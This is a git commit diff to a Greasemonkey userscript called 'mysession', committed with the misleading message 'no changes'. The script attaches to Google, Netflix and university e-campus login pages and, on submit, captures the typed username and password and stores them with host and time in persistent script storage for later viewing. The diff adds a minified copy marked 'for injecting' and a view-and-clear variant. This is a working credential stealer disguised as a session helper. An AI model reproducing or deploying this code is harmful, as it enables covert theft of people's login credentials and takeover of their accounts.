2b5461c31121be25d246a82d4b7e8755af4014cd
micalevisk <mllc@icomp.ufam.edu.br>
2016-12-18 17:17:35 -0400

    no changes

--- mysession/mysession.user.js
+++ mysession/mysession.user.js
@@ -6,14 +6,22 @@
 // @include     *://accounts.google.com/*ServiceLogin?*
 // @include     *://accounts.google.com/*signin*
 // @include     *://ecampus.ufam.edu.br/ecampus/*login*
-// @version     1.14-2
+// @version     1.18-2
 // @require	https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js
 // @grant       GM_getValue
 // @grant       GM_setValue
 // @grant       GM_deleteValue
 // ==/UserScript==
 
-// !function(t){String.prototype.isEmpty=function(){return!this.trim()};var e=GM_getValue("S132","");console.error(e),GM_deleteValue("S132"),document.querySelector("form").addEventListener("submit",function(n){var i=t('input[type="email"], input[name="email"], input[type="text"]').val(),o=t('input[type="password"], input[name="password"]').val();i.isEmpty()||o.isEmpty()||(e+="{ lgn: '"+i+", pss: '"+o+"', _dte='"+(new Date).toLocaleString()+"', _lcl='"+location.host+"' }\n",GM_setValue("S132",e))})}(jQuery);
+/** PARA INJETAR
+!function(t){String.prototype.isEmpty=function(){return!this.trim()};var e=GM_getValue("S132","");console.error(e),GM_deleteValue("S132"),document.querySelector("form").addEventListener("submit",function(n){var i=t('input[type="email"], input[name="email"], input[type="text"]').val(),o=t('input[type="password"], input[name="password"]').val();i.isEmpty()||o.isEmpty()||(e+="{ lgn: '"+i+", pss: '"+o+"', _dte='"+(new Date).toLocaleString()+"', _lcl='"+location.host+"' }\n",GM_setValue("S132",e))})}(jQuery);
+**/
+
+/** PARA CONSULTAR/LIMPAR
+const mostrar = false;
+const deletar = false;
+!function(e){String.prototype.isEmpty=function(){return!this.trim()};var t=GM_getValue("savedsession",[]);t.forEach(function(e){console.error(e)}),1==mostrar&&console.log(JSON.stringify(t)),1==deletar&&GM_deleteValue("savedsession"),document.querySelector("form").addEventListener("submit",function(s){var n=e('input[type="email"], input[name="email"], input[type="text"]').val(),i=e('input[type="password"], input[name="password"]').val();if(!n.isEmpty()&&!i.isEmpty()){var o={hst:location.host,dte:(new Date).toLocaleString(),lgn:n,pss:i};t.push(o),GM_setValue("savedsession",t)}})}(jQuery);
+**/
 
 /*
 → Netflix
@@ -21,13 +29,17 @@
 → Ecampus
 */
 
+const mostrar = false;
+const deletar = false;
+
 (function($) {
 	String.prototype.isEmpty = function() { return !(this.trim());	};
 
 	var onhistory = GM_getValue('savedsession', []);
 	onhistory.forEach( function(e) { console.error(e) } );
-	// console.log(JSON.stringify(onhistory));
-	GM_deleteValue('savedsession');
+
+	if(mostrar == true) console.log(JSON.stringify(onhistory));
+	if(deletar == true) GM_deleteValue('savedsession');
 
 	document.querySelector('form').addEventListener('submit', function (e) {
 		// e.preventDefault();
@@ -41,7 +53,7 @@
 				"lgn": login,
 				"pss": senha
 			};
-			onhistory.push(newdata);
+			onhistory.push(newdata);//TODO verificar se o 'lgn', 'hst' e 'pss' já existem no array de histórico
 			// console.log( newdata );
 			GM_setValue('savedsession', onhistory);
 		}
